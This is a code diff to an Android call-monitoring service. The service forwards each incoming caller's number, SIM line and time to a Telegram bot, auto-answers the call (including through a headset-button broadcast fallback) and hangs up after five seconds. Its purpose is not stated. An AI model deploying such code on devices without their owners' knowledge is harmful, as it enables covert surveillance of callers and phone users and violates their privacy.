@@ -22,6 +22,7 @@ import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyCallback;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.view.KeyEvent;
 
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
@@ -45,6 +46,12 @@ public class CallMonitorService extends Service {
     private String lastIncomingNumber = "";
     private PowerManager.WakeLock wakeLock;
     private BroadcastReceiver callReceiver;
+
+    // Debounce fields
+    private Handler debounceHandler = new Handler(Looper.getMainLooper());
+    private Runnable sendNotificationRunnable;
+    private String pendingNumber = null;
+    private int pendingSimSlot = -1;
 
     @Override
     public void onCreate() {
@@ -207,50 +214,103 @@ public class CallMonitorService extends Service {
     }
     
     private void handleCallState(int state, String incomingNumber, int simSlot) {
-        if (incomingNumber == null) incomingNumber = "Unknown";
-        if (lastIncomingNumber.equals(incomingNumber) && state == TelephonyManager.CALL_STATE_RINGING) {
-            return; // Duplicate
-        }
-        
-        CustomExceptionHandler.log(this, "Call State: " + state + ", Number: " + incomingNumber + ", SIM: " + simSlot);
+        // Debounce Logic for Ringing
+        if (state == TelephonyManager.CALL_STATE_RINGING) {
+            
+            // 1. Update pending data if available
+            if (incomingNumber != null && !incomingNumber.isEmpty() && !incomingNumber.equals("Unknown")) {
+                pendingNumber = incomingNumber;
+            }
+            if (simSlot != -1) {
+                pendingSimSlot = simSlot;
+            }
 
-        switch (state) {
-            case TelephonyManager.CALL_STATE_RINGING:
-                isRinging = true;
-                callStartTime = System.currentTimeMillis();
-                lastIncomingNumber = incomingNumber;
-                
-                String simInfo = (simSlot != -1) ? "SIM " + simSlot : "Unknown SIM";
-                
-                String msg = "📞 Incoming Call Detected!\n" +
-                        "🔢 Number: " + incomingNumber + "\n" +
-                        "📱 Line: " + simInfo + "\n" +
-                        "⏰ Time: " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
-                
-                telegramSender.sendMessage(msg);
-                
-                // Auto Answer Logic
-                attemptAutoAnswer();
-                break;
-                
-            case TelephonyManager.CALL_STATE_OFFHOOK:
-                if (isRinging) {
-                    // Call Answered
-                    // Start 5 second timer to hang up
-                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-                        @Override
-                        public void run() {
-                            attemptHangUp();
-                        }
-                    }, 5000);
+            // 2. If we don't have a runnable scheduled, schedule one
+            if (sendNotificationRunnable != null) {
+                debounceHandler.removeCallbacks(sendNotificationRunnable);
+            }
+
+            sendNotificationRunnable = new Runnable() {
+                @Override
+                public void run() {
+                    processRingingCall();
                 }
-                isRinging = false;
-                break;
-                
-            case TelephonyManager.CALL_STATE_IDLE:
-                isRinging = false;
-                break;
+            };
+            
+            // Wait 500ms to gather data (SIM + Number)
+            debounceHandler.postDelayed(sendNotificationRunnable, 500);
+            
+        } else if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
+            // Cancel pending ringing notification if answered very quickly
+             if (sendNotificationRunnable != null) {
+                debounceHandler.removeCallbacks(sendNotificationRunnable);
+            }
+            
+            CustomExceptionHandler.log(this, "Call Offhook. Scheduling Hangup in 5s.");
+            // Call Answered
+            // Start 5 second timer to hang up
+            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    attemptHangUp();
+                }
+            }, 5000);
+            
+            isRinging = false;
+        } else if (state == TelephonyManager.CALL_STATE_IDLE) {
+            isRinging = false;
+            // Reset pending data
+            pendingNumber = null;
+            pendingSimSlot = -1;
+            if (sendNotificationRunnable != null) {
+                debounceHandler.removeCallbacks(sendNotificationRunnable);
+            }
         }
+    }
+    
+    private void processRingingCall() {
+        // Check if we have valid data
+        String number = (pendingNumber != null) ? pendingNumber : "Unknown";
+        
+        // Filter out Unknown numbers if user requested
+        if (number.equals("Unknown")) {
+             CustomExceptionHandler.log(this, "Skipping notification for Unknown number");
+             attemptAutoAnswer();
+             return; 
+        }
+
+        if (lastIncomingNumber.equals(number) && isRinging) {
+            return; // Already handled
+        }
+
+        // Try to recover SIM info if missing and only 1 SIM exists
+        if (pendingSimSlot == -1) {
+            if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                 android.telephony.SubscriptionManager subscriptionManager = getSystemService(android.telephony.SubscriptionManager.class);
+                 if (subscriptionManager != null) {
+                     java.util.List<android.telephony.SubscriptionInfo> subs = subscriptionManager.getActiveSubscriptionInfoList();
+                     if (subs != null && subs.size() == 1) {
+                         pendingSimSlot = subs.get(0).getSimSlotIndex() + 1;
+                     }
+                 }
+            }
+        }
+
+        isRinging = true;
+        callStartTime = System.currentTimeMillis();
+        lastIncomingNumber = number;
+        
+        String simInfo = (pendingSimSlot != -1) ? "SIM " + pendingSimSlot : "Unknown SIM";
+        
+        String msg = "📞 Incoming Call Detected!\n" +
+                "🔢 Number: " + number + "\n" +
+                "📱 Line: " + simInfo + "\n" +
+                "⏰ Time: " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
+        
+        telegramSender.sendMessage(msg);
+        
+        // Auto Answer Logic
+        attemptAutoAnswer();
     }
     
     private void attemptAutoAnswer() {
@@ -265,8 +325,23 @@ public class CallMonitorService extends Service {
                          Log.e("CallMonitorService", "Failed to answer call", e);
                          CustomExceptionHandler.logError(this, e);
                      }
+                 } else {
+                     Log.e("CallMonitorService", "ANSWER_PHONE_CALLS permission not granted");
                  }
              }
+        }
+        
+        // Fallback for older devices or if TelecomManager fails (though less likely to work on modern Android)
+        try {
+            Intent intent = new Intent(Intent.ACTION_MEDIA_BUTTON);
+            intent.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_HEADSETHOOK));
+            sendOrderedBroadcast(intent, null);
+            
+            intent = new Intent(Intent.ACTION_MEDIA_BUTTON);
+            intent.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_HEADSETHOOK));
+            sendOrderedBroadcast(intent, null);
+        } catch (Exception e) {
+            // Ignore
         }
     }
 
